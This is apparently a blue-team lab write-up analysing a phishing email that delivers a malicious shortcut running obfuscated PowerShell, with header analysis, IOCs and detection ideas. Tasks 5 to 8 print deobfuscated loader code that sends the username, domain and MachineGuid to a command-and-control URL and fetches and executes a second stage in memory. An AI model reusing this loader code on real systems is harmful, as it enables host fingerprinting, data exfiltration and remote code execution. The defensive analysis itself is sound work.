# AoTR 1: A Call from the Museum!

**Category:** Malware Analysis / Email Forensics
**Author:** Panha (Nhakachh)
**Environment:** Kali Linux (venv), `blueteamlab/malware/extracted`

## Overview

This lab investigates a phishing email themed around a fake "EU Health Logistics Office" compliance notice. The email impersonates an internal domain via a homoglyph typosquat, delivers a password-protected ZIP archive containing a malicious `.lnk` shortcut disguised as a "compliance portal" shortcut plus a decoy PDF, and ultimately executes an obfuscated PowerShell one-liner that beacons to a C2 server and pulls a second-stage payload from an HTB-themed domain.

The investigation covers full email header/body analysis, archive extraction, decoy document analysis, and LNK/PowerShell payload deobfuscation.

## Tools Used

- `unzip` — archive extraction
- `pdftotext` / `pdftoppm` — decoy PDF text/rendering analysis
- `lnkparse` (`lnkparse3`) — Windows Shortcut (`.lnk`) structure parsing
- Manual header analysis (`Received`, `Authentication-Results`, `Return-Path`, `X-Pm-Origin`)
- `[System.Uri]::UnescapeDataString` reverse-engineering (manual, from PowerShell source)
- Base64 decoding (manual, for the Basic Auth header)

## Artifacts

| File | Description |
|---|---|
| `textfile1` | Decoded HTML body of the phishing email |
| `Health_Clearance-December_Archive.zip` | Password-protected malicious archive (`Up7Pk99G`) |
| `EU_Health_Compliance_Portal.lnk` | Malicious Windows shortcut — actual payload dropper |
| `Health_Clearance_Guidelines.pdf` | Decoy PDF opened to distract the victim during execution |

---

## Task 1 — Identify the Suspicious Sender

**Sender:** `EU Health Logistics Office <eu-health@ca1e-corp.org>`

The giveaway is a homoglyph/typosquat domain:

- **Spoofed domain:** `ca1e-corp.org` (uses the digit `1` in place of the letter `l`)
- **Victim's real domain:** `cale-corp.org` (confirmed via `To:` / `X-Original-To:` headers — `kamil.poltavez@cale-corp.org`)

Supporting evidence of spoofing/malicious intent:

| Header | Value | Notes |
|---|---|---|
| `Return-Path` | `eu-health@ca1e-corp.org` | Matches the spoofed lookalike domain |
| `Authentication-Results` | `dmarc=none (p=none)`, `dkim=none` | No DKIM signature; DMARC not enforced |
| `Authentication-Results` | `spf=pass smtp.mailfrom=ca1e-corp.org` | SPF only validates the fake domain, says nothing about `cale-corp.org` |
| `X-Pm-Origin` | `external` | Marked external despite posing as an internal unit |
| Body | Password-protected ZIP, urgency language, embedded shortcut | Classic phishing/malware delivery pattern |
| Attachment | `.lnk` disguised as a portal shortcut + decoy PDF | `.lnk` is the actual dropper/loader |

**Conclusion:** The attacker registered `ca1e-corp.org` to impersonate `cale-corp.org`, spoofed an internal-sounding "EU Health Logistics Office" persona, used urgency/compliance pretext plus a password-protected archive to evade AV/attachment scanning, and dropped a malicious `.lnk` to compromise `kamil.poltavez@cale-corp.org`.

---

## Task 2 — Legitimate/Originating Server

The earliest (bottom-most) `Received:` header shows the message was routed through Microsoft 365 / Exchange Online Protection infrastructure:

```
Received: from BG1P293CU004.outbound.protection.outlook.com
 (mail-serbianorthazon11020077.outbound.protection.outlook.com [52.101.176.77])
```

However, the **true originating internal Exchange mailbox server** (where the message was composed/submitted via MAPI) is:

```
BG3O293MB0335.SRBL293.PROD.OUTLOOK.COM
```

from the header:

```
Received: from BG3O293MB0335.SRBL293.PROD.OUTLOOK.COM ([fe80::deb0:79a0:1091:c278]) by
 BG3O293MB0335.SRBL293.PROD.OUTLOOK.COM ([fe80::deb0:79a0:1091:c278%3]) with mapi id
 15.20.9412.011; Fri, 14 Nov 2025 20:33:16 +0000
```

**Answer:** `BG3O293MB0335.SRBL293.PROD.OUTLOOK.COM` — a self-to-self MAPI hop, meaning the attacker sent this from a legitimate (likely compromised or trial/throwaway) Microsoft 365 tenant registered under the lookalike domain, which is why SPF/DKIM/ARC show as passing for `ca1e-corp.org`.

---

## Task 3 — Attachment Filename

```
Health_Clearance-December_Archive.zip
```

Password (from the HTML body): `Up7Pk99G`

Extraction:

```bash
unzip Health_Clearance-December_Archive.zip
```

yields:

```
EU_Health_Compliance_Portal.lnk
Health_Clearance_Guidelines.pdf
```

---

## Task 4 — Document Code

Extracted from the decoy PDF:

```bash
pdftotext Health_Clearance_Guidelines.pdf - | grep -i "document code"
```

Output:

```
European Cross-Border Festive Operations — Document Code EU-HMU-24X — December Cycle — Binding Internal Guidance
```

**Answer:** `EU-HMU-24X`

---

## Task 5 — Full C2 URL Contacted via POST

Parsing the `.lnk` reveals it launches:

```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nONi -nOp -eXeC bYPaSs -cOmManD "..."
```

The embedded command is heavily padded with whitespace and mixed-case flags to evade simple signature matching. Deobfuscating the relevant section:

```powershell
$AX = $env:USERNAME
$oM = [System.Uri]::UnescapeDataString('https%3A%2F%2Fhealth%2Dstatus%2Drs%2Ecom%2Fapi%2Fv1%2Fcheckin')
$Bz = $env:USERDOMAIN
$Mw = (gp HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid
$pP = @{u=$AX; d=$Bz; g=$Mw}
$Zu = (iwr $oM -Method POST -Body $pP).Content
```

URL-decoding `$oM`:

```
https://health-status-rs.com/api/v1/checkin
```

**Answer:** `https://health-status-rs.com/api/v1/checkin`

---

## Task 6 — Registry Key for the Last POST Field

The POST body `$pP = @{u=$AX; d=$Bz; g=$Mw}` sends three fields:

| Field | Source |
|---|---|
| `u` | `$env:USERNAME` |
| `d` | `$env:USERDOMAIN` |
| `g` | Registry-derived `MachineGuid` |

Only the `g` field is retrieved from the registry, via:

```powershell
(gp HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid
```

**Answer:** `HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid`

This is the well-known per-machine unique identifier used for host fingerprinting, commonly abused by malware/loaders to track infected endpoints across campaigns.

---

## Task 7 — Second-Stage Domain

After the checkin POST completes, the response body (`$Zu`) is appended to a second, URL-decoded address and fetched:

```powershell
$Lj = [System.Uri]::UnescapeDataString('https%3A%2F%2Fadvent%2Dof%2Dthe%2Drelics%2Dforum%2Ehtb%2Eblue%2Fapi%2Fv1%2Fimplant%2Fcid%3D')
...
iwr -Headers $Hd $Lj$Zu | iex
```

Decoded:

```
https://advent-of-the-relics-forum.htb.blue/api/v1/implant/cid=
```

The value returned from the first-stage checkin (`$Zu`) is dynamically appended as the `cid=` parameter, meaning the C2 controls exactly which implant/second-stage identifier gets requested per victim.

**Answer:** `advent-of-the-relics-forum.htb.blue`

---

## Task 8 — Credentials Used to Access the Second-Stage Resource

The second-stage request sends an `Authorization` header built from concatenated base64 fragments — a simple string-splitting obfuscation technique to defeat static string/YARA matching:

```powershell
$Bs = (-join('Basic c3','ZjX3Rlb','XA6U2','5','vd0JsY','WNrT','3V','0X','zIwM','jYh'))
$Hd = @{Authorization = $Bs}
iwr -Headers $Hd $Lj$Zu | iex
```

Joining the fragments:

```
Basic c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh
```

Base64-decoding `c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh` gives the raw `user:pass` string:

**Answer:** `svc_temp:SnowBlackOut_2026!`

---

## Full Attack Chain Summary

1. **Delivery:** Phishing email from spoofed domain `ca1e-corp.org` (impersonating `cale-corp.org`), sent from a compromised/throwaway M365 tenant, urgency-themed "health compliance" pretext.
2. **Evasion:** Password-protected ZIP (`Up7Pk99G`) to dodge attachment scanning.
3. **Execution:** Victim runs `EU_Health_Compliance_Portal.lnk`, which silently launches hidden, obfuscated PowerShell (`-nONi -nOp -eXeC bYPaSs`) while opening the decoy PDF (`Health_Clearance_Guidelines.pdf`, Document Code `EU-HMU-24X`) for cover.
4. **C2 Check-in:** POSTs `username`, `userdomain`, and registry-derived `MachineGuid` (`HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid`) to `https://health-status-rs.com/api/v1/checkin`.
5. **Dynamic Second Stage:** The checkin response is used as a `cid=` parameter appended to `https://advent-of-the-relics-forum.htb.blue/api/v1/implant/cid=<response>`.
6. **Authenticated Fetch & In-Memory Execution:** Retrieves the second stage using Basic Auth (`svc_temp:SnowBlackOut_2026!`) and pipes the response directly into `iex` — no payload ever touches disk.

## Indicators of Compromise (IOCs)

| Type | Value |
|---|---|
| Spoofed sender domain | `ca1e-corp.org` |
| Sender address | `eu-health@ca1e-corp.org` |
| Archive | `Health_Clearance-December_Archive.zip` (pw: `Up7Pk99G`) |
| Malicious shortcut | `EU_Health_Compliance_Portal.lnk` |
| Decoy document | `Health_Clearance_Guidelines.pdf` (Doc Code `EU-HMU-24X`) |
| C2 checkin URL | `https://health-status-rs.com/api/v1/checkin` |
| Second-stage domain | `advent-of-the-relics-forum.htb.blue` |
| Registry artifact accessed | `HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid` |
| Basic Auth credential | `svc_temp:SnowBlackOut_2026!` |

## Detection Notes / Follow-Up Ideas

- Flag LNK files whose `Command line arguments` field is abnormally long/padded (whitespace-stuffing to break signature length checks).
- Flag case-randomized PowerShell flags (`-eXeC bYPaSs`, `-nONi -nOp`) — a common technique to defeat naive string matching.
- Flag `Invoke-WebRequest | Invoke-Expression` (`iwr ... | iex`) patterns — fileless in-memory second-stage execution.
- Flag reads of `HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid` from non-system processes — a common host-fingerprinting technique for C2 tracking.
- Consider Sigma/Wazuh rules matching split-string Base64 obfuscation (`-join(...)` with fragmented literals) as a generic PowerShell obfuscation heuristic.
